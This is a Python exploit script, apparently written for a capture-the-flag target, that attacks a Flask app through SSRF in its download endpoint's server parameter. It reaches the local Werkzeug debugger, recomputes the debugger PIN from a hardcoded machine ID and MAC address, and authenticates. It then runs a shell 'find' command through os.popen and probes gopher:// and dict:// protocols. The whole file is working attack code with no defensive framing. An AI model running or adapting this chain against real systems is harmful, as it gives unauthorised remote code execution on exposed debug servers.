"""
Access Werkzeug debugger via SSRF from localhost to bypass PIN exhaustion.
Then execute find command to locate .txt files.
"""
import requests
import hashlib
import re
from itertools import chain
from urllib.parse import quote

T = "http://10.82.168.213"

# Step 1: Get a debugger secret via SSRF from localhost
# We trigger an error through the SSRF, the error page contains the secret
print("[1] Triggering error via SSRF through localhost to get debugger secret...")

# This makes pycurl request: http://127.0.0.1:8087/download?server=INVALID&id=1#/public-docs.../1.pdf
ssrf_url = f"{T}/download?server=http://127.0.0.1:8087/download?server=INVALID%26id=1%23&id=1"
r = requests.get(ssrf_url, timeout=15)
print(f"  Status: {r.status_code}, Len: {len(r.text)}")

# Extract secret
secrets = re.findall(r'SECRET\s*=\s*"([^"]+)"', r.text)
if not secrets:
    secrets = re.findall(r"SECRET\s*=\s*'([^']+)'", r.text)
print(f"  JS SECRET: {secrets}")

# Also look at the raw text for s= patterns
s_params = re.findall(r's=([a-zA-Z0-9_-]+)', r.text)
print(f"  s= params: {s_params}")

# Save response
with open("plantphoto_hunt/ssrf_debug_page.html", "w", encoding="utf-8") as f:
    f.write(r.text)
print(f"  Saved error page")

if not secrets and not s_params:
    # Maybe the inner request didn't cause an error. Try different approach
    print("\n  Trying alternative error triggers...")
    
    # Approach: use # to cleanly request the debugger page
    alts = [
        # Direct error trigger
        f"{T}/download?server=http://127.0.0.1:8087/download?server=x%26id=1%23&id=1",
        # Try to get an error via invalid file id
        f"{T}/download?server=http://127.0.0.1:8087/download?server=x%26id=abc%23&id=1",
        # Try to access non-existent route
        f"{T}/download?server=http://127.0.0.1:8087/nonexistent%23&id=1",
    ]
    
    for alt_url in alts:
        r2 = requests.get(alt_url, timeout=15)
        secrets2 = re.findall(r'SECRET\s*=\s*["\']([^"\']+)', r2.text)
        s2 = re.findall(r's=([a-zA-Z0-9_-]+)', r2.text)
        print(f"  Alt URL len={len(r2.text)}: secrets={secrets2}, s={s2}")
        if secrets2:
            secrets = secrets2
            break

# Step 2: Calculate PIN  
print("\n[2] Calculating correct PIN...")
# From Werkzeug 0.16.0 source:
# get_machine_id() reads first line of /proc/self/cgroup, 
#   .strip().partition("/docker/")[2] => container ID
# if found, returns immediately
machine_id = "77c09e05c4a947224997c3baa49e5edf161fd116568e90a28a60fca6fde049ca"
mac_int = 2485378088962  # 02:42:ac:14:00:02

probably_public_bits = [
    "root",
    "flask.app", 
    "Flask",
    "/usr/local/lib/python3.10/site-packages/flask/app.py",
]
private_bits = [str(mac_int), machine_id]

h = hashlib.md5()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")
cookie_name = "__wzd" + h.hexdigest()[:20]
h.update(b"pinsalt")
num = ("%09d" % int(h.hexdigest(), 16))[:9]
pin = "-".join(num[x:x+3] for x in range(0, 9, 3))

print(f"  PIN = {pin}")
print(f"  Cookie = {cookie_name}")

# Step 3: Try PIN auth via SSRF from localhost
if secrets:
    secret = secrets[0]
    print(f"\n[3] Testing PIN via SSRF from localhost (secret={secret})...")
    
    # Construct URL to auth via SSRF: pycurl will request from localhost
    pin_clean = pin.replace("-", "")
    auth_path = f"?__debugger__=yes&cmd=pinauth&pin={pin_clean}&s={secret}"
    ssrf_auth = f"{T}/download?server=http://127.0.0.1:8087/{quote(auth_path, safe='')}%23&id=1"
    
    r3 = requests.get(ssrf_auth, timeout=15)
    print(f"  Auth response ({len(r3.text)}): {r3.text[:300]}")
    
    if "true" in r3.text.lower():
        print("  PIN ACCEPTED from localhost!")
        
        # Execute find command
        find_cmd = "__import__('os').popen('find / -name *.txt 2>/dev/null').read()"
        exec_path = f"?__debugger__=yes&cmd={quote(find_cmd)}&frm=0&s={secret}"
        ssrf_exec = f"{T}/download?server=http://127.0.0.1:8087/{quote(exec_path, safe='')}%23&id=1"
        
        r4 = requests.get(ssrf_exec, timeout=30)
        clean = re.sub(r'<[^>]+>', '', r4.text)
        print(f"\n  find / -name *.txt:")
        print(f"  {clean[:1000]}")
    else:
        print("  PIN rejected or exhausted from localhost too.")
        
        # Try with dashes
        auth_path2 = f"?__debugger__=yes&cmd=pinauth&pin={pin}&s={secret}"
        ssrf_auth2 = f"{T}/download?server=http://127.0.0.1:8087/{quote(auth_path2, safe='')}%23&id=1"
        r3b = requests.get(ssrf_auth2, timeout=15)
        print(f"  With dashes: {r3b.text[:300]}")

else:
    print("\n[3] No secret found - trying alternative: direct debugger eval via error page...")
    
# Step 4: Alternative approach - use gopher:// or dict:// protocols
print("\n[4] Trying alternative protocols...")
protocols = [
    ("dict://127.0.0.1:8087/", "dict protocol"),
    ("gopher://127.0.0.1:8087/", "gopher protocol"),
]

for proto, desc in protocols:
    try:
        r = requests.get(f"{T}/download?server={proto}%23&id=1", timeout=8)
        if len(r.text) > 25 and "Werkzeug" not in r.text:
            print(f"  [{desc}]: {r.text[:200]}")
        else:
            err = re.findall(r"title>([^<]+)<", r.text)
            print(f"  [{desc}]: {err[0] if err else 'error'}")
    except Exception as e:
        print(f"  [{desc}]: {e}")
